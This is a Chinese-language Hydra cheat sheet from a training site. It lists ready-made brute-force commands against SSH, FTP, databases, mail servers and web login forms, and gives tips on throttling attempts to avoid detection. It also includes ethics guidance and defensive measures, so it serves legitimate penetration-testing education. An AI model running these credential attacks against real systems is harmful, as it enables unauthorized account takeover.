---
title: 'Hydra 速查表'
description: '使用我们涵盖基本命令、概念和最佳实践的综合速查表，快速掌握 Hydra。'
pdfUrl: '/cheatsheets/pdf/hydra-cheatsheet.pdf'
---

<base-title :title="frontmatter.title" :description="frontmatter.description">
Hydra 速查表
</base-title>

<base-pdf-url :url="frontmatter.pdfUrl" />

<base-disclaimer>
<base-disclaimer-title>
<a target="_blank" href="https://labex.io/zh/learn/hydra">通过实践实验室学习 Hydra</a>
</base-disclaimer-title>
<base-disclaimer-content>
通过实践实验室和真实场景学习 Hydra 密码破解和渗透测试。LabEx 提供全面的 Hydra 课程，涵盖协议攻击、Web 表单利用、性能优化和道德使用。掌握暴力破解技术，用于授权的安全测试和漏洞评估。
</base-disclaimer-content>
</base-disclaimer>

## 基本语法和安装

### 安装：`sudo apt install hydra`

Hydra 通常预装在 Kali Linux 上，但也可以安装在其他发行版上。

```bash
# 在 Debian/Ubuntu 系统上安装
sudo apt install hydra
# 在其他系统上安装
sudo apt-get install hydra
# 验证安装
hydra -h
# 查看支持的协议
hydra
```

### 基本语法：`hydra [options] target service`

基本语法：`hydra -l <username> -P <password_file> <target_protocol>://<target_address>`

```bash
# 单个用户名，密码文件
hydra -l username -P passwords.txt target.com ssh
# 用户名列表，密码文件
hydra -L users.txt -P passwords.txt target.com ssh
# 单个用户名，单个密码
hydra -l admin -p password123 192.168.1.100 ftp
```

### 核心选项：`-l`, `-L`, `-p`, `-P`

指定用于暴力破解的用户名和密码。

```bash
# 用户名选项
-l username          # 单个用户名
-L userlist.txt      # 用户名列表文件
# 密码选项
-p password          # 单个密码
-P passwordlist.txt  # 密码列表文件
# 常用字典文件位置
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/metasploit/unix_passwords.txt
```

### 输出选项：`-o`, `-b`

将结果保存到文件以便后续分析。

```bash
# 将结果保存到文件
hydra -l admin -P passwords.txt target.com ssh -o results.txt
# JSON 输出格式
hydra -l admin -P passwords.txt target.com ssh -b json
# 详细输出
hydra -l admin -P passwords.txt target.com ssh -V
```

## 特定协议攻击

### SSH: `hydra target ssh`

使用用户名和密码组合攻击 SSH 服务。

```bash
# 基本 SSH 攻击
hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.100 ssh
# 多个用户名
hydra -L users.txt -P passwords.txt ssh://192.168.1.100
# 自定义 SSH 端口
hydra -l admin -P passwords.txt 192.168.1.100 -s 2222 ssh
# 使用线程
hydra -l root -P passwords.txt -t 6 ssh://192.168.1.100
```

### FTP: `hydra target ftp`

暴力破解 FTP 登录凭证。

```bash
# 基本 FTP 攻击
hydra -l admin -P passwords.txt ftp://192.168.1.100
# 匿名 FTP 检查
hydra -l anonymous -p "" ftp://192.168.1.100
# 自定义 FTP 端口
hydra -l user -P passwords.txt -s 2121 192.168.1.100 ftp
```

### 数据库攻击：`mysql`, `postgres`, `mssql`

通过凭证暴力破解攻击数据库服务。

```bash
# MySQL 攻击
hydra -l root -P passwords.txt 192.168.1.100 mysql
# PostgreSQL 攻击
hydra -l postgres -P passwords.txt 192.168.1.100 postgres
# MSSQL 攻击
hydra -l sa -P passwords.txt 192.168.1.100 mssql
# MongoDB 攻击
hydra -l admin -P passwords.txt 192.168.1.100 mongodb
```

### SMTP/Email: `hydra target smtp`

攻击邮件服务器认证。

```bash
# SMTP 暴力破解
hydra -l admin -P passwords.txt smtp://mail.target.com
# 使用空/空密码
hydra -P passwords.txt -e ns -V -s 25 smtp.target.com smtp
# IMAP 攻击
hydra -l user -P passwords.txt imap://mail.target.com
```

## Web 应用程序攻击

### HTTP POST 表单：`http-post-form`

使用 HTTP POST 方法和占位符 `^USER^` 和 `^PASS^` 攻击 Web 登录表单。

```bash
# 基本 POST 表单攻击
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"
# 使用自定义错误消息
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid password"
# 使用成功条件
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/admin:username=^USER^&password=^PASS^:S=Dashboard"
```

### HTTP GET 表单：`http-get-form`

与 POST 表单类似，但针对 GET 请求。

```bash
# GET 表单攻击
hydra -l admin -P passwords.txt 192.168.1.100 http-get-form "/login:username=^USER^&password=^PASS^:F=Invalid"
# 使用自定义头信息
hydra -l admin -P passwords.txt 192.168.1.100 http-get-form "/auth:user=^USER^&pass=^PASS^:F=Error:H=Cookie: session=abc123"
```

### HTTP 基本认证：`http-get`/`http-post`

使用 HTTP 基本认证攻击 Web 服务器。

```bash
# HTTP 基本认证
hydra -l admin -P passwords.txt http-get://192.168.1.100
# HTTPS 基本认证
hydra -l admin -P passwords.txt https-get://secure.target.com
# 使用自定义路径
hydra -l admin -P passwords.txt http-get://192.168.1.100/admin
```

### 高级 Web 攻击

处理带有 CSRF 令牌和 Cookie 的复杂 Web 应用程序。

```bash
# 使用 CSRF 令牌处理
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login:username=^USER^&password=^PASS^&csrf=^CSRF^:F=Error:H=Cookie: csrf=^CSRF^"
# 使用会话 Cookie
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid:H=Cookie: PHPSESSID=abc123"
```

## 性能与线程选项

### 线程：`-t` (任务数)

控制攻击期间同时进行的攻击连接数。

```bash
# 默认线程数 (16 个任务)
hydra -l admin -P passwords.txt target.com ssh
# 自定义线程数
hydra -l admin -P passwords.txt -t 4 target.com ssh
# 高性能攻击 (谨慎使用)
hydra -l admin -P passwords.txt -t 64 target.com ssh
# 节制线程 (避免被检测)
hydra -l admin -P passwords.txt -t 1 target.com ssh
```

### 等待时间：`-w` (延迟)

在尝试之间添加延迟，以避免速率限制和检测。

```bash
# 每次尝试之间等待 30 秒
hydra -l admin -P passwords.txt -w 30 target.com ssh
# 与线程结合使用
hydra -l admin -P passwords.txt -t 2 -w 10 target.com ssh
# 随机延迟 (1-5 秒)
hydra -l admin -P passwords.txt -W 5 target.com ssh
```

### 多个目标：`-M` (目标文件)

通过在文件中指定主机来攻击多个主机。

```bash
# 创建目标文件
echo "192.168.1.100" > targets.txt
echo "192.168.1.101" >> targets.txt
echo "192.168.1.102" >> targets.txt
# 攻击多个目标
hydra -L users.txt -P passwords.txt -M targets.txt ssh
# 使用每个目标的自定义线程
hydra -L users.txt -P passwords.txt -M targets.txt -t 2 ssh
```

### 恢复和停止选项

恢复中断的攻击并控制停止行为。

```bash
# 首次成功后停止
hydra -l admin -P passwords.txt -f target.com ssh
# 恢复先前攻击
hydra -R
# 创建恢复文件
hydra -l admin -P passwords.txt -I restore.txt target.com ssh
```

## 高级功能与选项

### 密码生成：`-e` (附加测试)

自动测试其他密码变体。

```bash
# 测试空密码
hydra -l admin -e n target.com ssh
# 测试用户名作为密码
hydra -l admin -e s target.com ssh
# 测试反向用户名
hydra -l admin -e r target.com ssh
# 组合所有选项
hydra -l admin -e nsr -P passwords.txt target.com ssh
```

### 冒号分隔格式：`-C`

使用用户名：密码组合来减少攻击时间。

```bash
# 创建凭证文件
echo "admin:admin" > creds.txt
echo "root:password" >> creds.txt
echo "user:123456" >> creds.txt
# 使用冒号格式
hydra -C creds.txt target.com ssh
# 比测试完整组合更快
```

### 代理支持：`HYDRA_PROXY`

使用环境变量通过代理服务器进行攻击。

```bash
# HTTP 代理
export HYDRA_PROXY=connect://proxy.example.com:8080
hydra -l admin -P passwords.txt target.com ssh
# 带认证的 SOCKS4 代理
export HYDRA_PROXY=socks4://user:pass@127.0.0.1:1080
# SOCKS5 代理
export HYDRA_PROXY=socks5://proxy.example.com:1080
```

### 密码列表优化：`pw-inspector`

使用 pw-inspector 根据策略过滤密码列表。

```bash
# 过滤密码 (最小 6 个字符，2 个字符类别)
cat passwords.txt | pw-inspector -m 6 -c 2 -n > filtered.txt
# 使用过滤后的列表进行 Hydra 攻击
hydra -l admin -P filtered.txt target.com ssh
# 先删除重复项
cat passwords.txt | sort | uniq > unique_passwords.txt
```

## 合法使用与最佳实践

### 法律与道德准则

使用 Hydra 既可以合法，也可以非法。在执行暴力破解攻击前，请获得适当的许可和批准。

```text
仅对已获得明确许可的系统执行攻击
务必确保您已获得系统所有者或管理员的明确许可
记录所有测试活动以供合规
仅在授权的渗透测试中使用
切勿用于未经授权的访问尝试
```

### 防御措施

通过强密码和策略防御暴力破解攻击。

```text
实施账户锁定策略，在失败尝试后暂时锁定账户
使用多因素认证 (MFA)
实施 CAPTCHA 系统以防止自动化工具
监控和记录身份验证尝试
实施速率限制和 IP 阻止
```

### 测试最佳实践

以保守的设置开始，并记录所有活动以保持透明度。

```text
以低线程计数开始，以避免服务中断
使用适合目标环境的字典文件
尽可能在批准的维护窗口期间进行测试
测试期间监控目标系统性能
准备好事件响应程序
```

### 常见用例

红队和蓝队都受益于密码审计、安全评估和渗透测试。

```text
密码破解，以识别弱密码并评估密码强度
网络服务的安全审计
渗透测试和漏洞评估
密码策略的合规性测试
培训和教育演示
```

## GUI 替代方案和附加工具

### XHydra: 图形界面

XHydra 是 Hydra 的一个 GUI，允许通过图形控件而不是命令行开关选择配置。

```bash
# 启动 XHydra GUI
xhydra
# 如果不可用，则安装
sudo apt install hydra-gtk
# 特点:
# - 点击式界面
# - 预配置的攻击模板
# - 可视化进度监控
# - 轻松选择目标和字典文件
```

### Hydra Wizard: 交互式设置

交互式向导，通过简单的问题引导用户完成 Hydra 设置。

```bash
# 启动交互式向导
hydra-wizard
# 向导询问:
# 1. 要攻击的服务
# 2. 要攻击的目标
# 3. 用户名或用户名文件
# 4. 密码或密码文件
# 5. 附加的密码测试
# 6. 端口号
# 7. 最终确认
```

### 默认密码列表：`dpl4hydra`

为特定品牌和系统生成默认密码列表。

```bash
# 刷新默认密码数据库
dpl4hydra refresh
# 为特定品牌生成列表
dpl4hydra cisco
dpl4hydra netgear
dpl4hydra linksys
# 使用生成的列表
hydra -C dpl4hydra_cisco.lst 192.168.1.1 ssh
# 所有品牌
dpl4hydra all
```

### 与其他工具的集成

将 Hydra 与侦察和枚举工具结合使用。

```bash
# 与 Nmap 服务发现结合
nmap -sV 192.168.1.0/24 | grep -E "(ssh|ftp|http)"
# 使用用户名枚举结果
enum4linux 192.168.1.100 | grep "user:" > users.txt
# 与 Metasploit 字典集成
ls /usr/share/wordlists/metasploit/
```

## 故障排除与性能

### 常见问题与解决方案

解决使用 Hydra 时遇到的典型问题。

```bash
# 连接超时错误
hydra -l admin -P passwords.txt -t 1 -w 30 target.com ssh
# 连接数过多错误
hydra -l admin -P passwords.txt -t 2 target.com ssh
# 内存使用优化
hydra -l admin -P small_list.txt target.com ssh
# 检查支持的协议
hydra
# 在支持的服务列表中查找协议
```

### 性能优化

优化密码列表，按可能性排序以加快结果。

```bash
# 按可能性排序密码
hydra -l admin -P passwords.txt -u target.com ssh
# 删除重复项
sort passwords.txt | uniq > clean_passwords.txt
# 根据目标优化线程
# 本地网络: -t 16
# 互联网目标: -t 4
# 慢速服务: -t 1
```

### 输出格式与分析

不同的输出格式用于结果分析和报告。

```bash
# 标准文本输出
hydra -l admin -P passwords.txt target.com ssh -o results.txt
# 用于解析的 JSON 格式
hydra -l admin -P passwords.txt target.com ssh -b json -o results.json
# 用于调试的详细输出
hydra -l admin -P passwords.txt target.com ssh -V
# 仅成功输出
hydra -l admin -P passwords.txt target.com ssh | grep "password:"
```

### 资源监控

在攻击期间监控系统和网络资源。

```bash
# 监控 CPU 使用率
top -p $(pidof hydra)
# 监控网络连接
netstat -an | grep :22
# 监控内存使用情况
ps aux | grep hydra
# 限制系统影响
nice -n 19 hydra -l admin -P passwords.txt target.com ssh
```

## 相关链接

- <router-link to="/kali">Kali Linux 速查表</router-link>
- <router-link to="/cybersecurity">网络安全速查表</router-link>
- <router-link to="/nmap">Nmap 速查表</router-link>
- <router-link to="/wireshark">Wireshark 速查表</router-link>
- <router-link to="/comptia">CompTIA 速查表</router-link>
- <router-link to="/linux">Linux 速查表</router-link>
- <router-link to="/shell">Shell 速查表</router-link>
- <router-link to="/devops">DevOps 速查表</router-link>
